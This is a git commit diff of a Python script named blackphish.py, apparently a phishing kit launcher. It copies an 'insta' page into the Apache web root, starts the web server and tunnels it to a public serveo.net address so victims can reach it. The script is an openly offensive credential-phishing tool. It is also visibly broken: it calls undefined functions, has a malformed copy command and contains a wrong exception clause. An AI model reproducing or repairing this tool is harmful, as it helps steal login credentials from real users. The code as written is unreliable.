3037ad416b48f2d7f81855a14e9d7d4c8adcf7d4
inc0gnit0 <iinc0gnit0@pm.me>
2019-10-30 17:13:22 -0500

    Add files via upload

--- blackphish.py
+++ blackphish.py
@@ -1,45 +1,82 @@
+#!/usr/bin/python3
+
+# version 1.5: - Check for root - Added color - Changed icons
+
+# Please update version number each time we update
+
 try:
-    import os
-    #subproccess
-        
+	import os
+	#subproccess
+
 except ImportError():
-    print("Error importing")
-    exit(1)
+	print("\033[31;1m" + "[-] Error importing")
+	exit(1)
+
+ # Variables #
+
+cwd = os.getcwd()
+
+# COLORS #
+
+red = "\033[31;1m"
+
+reset = "\033[0m"
+
+green = "\033[32;1m"
+
+cyan = "\033[36;1m"
+
+yellow = "\033[33;1m"
+
+magenta = "\033[35;1m"
+
+blue = "\033[34;1m"
+
+white = "\033[37;1m"
 
 
+
+if os.geteuid() != 0:
+	exit(red + "[!] Please run as root" + reset)
+
+def serveo_forward(): # Port forward to serveo#
+	os.system('nohup ssh -R inc0gnit0:80:localhost:80 serveo.net')
+	#subprocess.Popen(["rm","-r","some.file"])
 
 def main():  # Main script #
-    pwd = os.getcwd
-    def install(): # Host webpage #
-        os.system('cp ' + pwd + '/' + ' insta' '/var/www/html/')
-    def serveo_forward(): # Port forward to serveo#
-        os.system('nohup ssh -R inc0gnit0:80:localhost:80 serveo.net')
-        #subprocess.Popen(["rm","-r","some.file"])
-    choice = input("[BlackPhish] -> ") # Get user input #
-    if choice == "1":
-        print('[*] Copying Files')
-        install()
-        print('[*] Starting Apache2 Service')
-        os.system('service apache2 start')
-        serveo_forward()
-        print('[*] Forwarding Traffic to \"https://inc0gnit0.serveo.net/\"')
-        print('[*] Done')
-        #os.system('clear')
-        main()
+	platform()
 
-    #elif choice == "clean":
-        #os.system('service apache2 stop')
-            
-    elif choice == "":
-        main()
+	serveo_forward()
 
-    elif choice == "clear":
-        os.system('clear')
-        main()
+	os.system('cp ' + cwd + '/' + ' insta' '/var/www/html/')
 
-    #elif choice == "help"
-        #print('')
-    
+	choice = input(magenta + "[BlackPhish] -> ") # Get user input #
+
+	if choice == "1":
+		print(green + '[+] Copying Files')
+		install()
+		print(green + '[+] Starting Apache2 Service')
+		os.system('service apache2 start')
+		serveo_forward()
+		print(green + '[+] Forwarding Traffic to \"https://inc0gnit0.serveo.net/\"')
+		print(green + '[+] Done')
+		#os.system('clear')
+		main()
+
+	elif choice == "clean":
+		os.system('service apache2 stop')
+
+	elif choice == "clear":
+		os.system('clear')
+		main()
+
+	#elif choice == "help":
+		#print('')
+
+	else:
+		print(red + "[!] Invalid option")
+		main()
+
 
 try: # This will start the script
 	if __name__ == '__main__':
@@ -47,5 +84,5 @@ try: # This will start the script
 
 except KeyboardInterrupt: # Will detect if they exit #
 	print("\n")
-	print("Exiting")
+	print(red + "[!] Exiting" + reset)
 	exit(0)
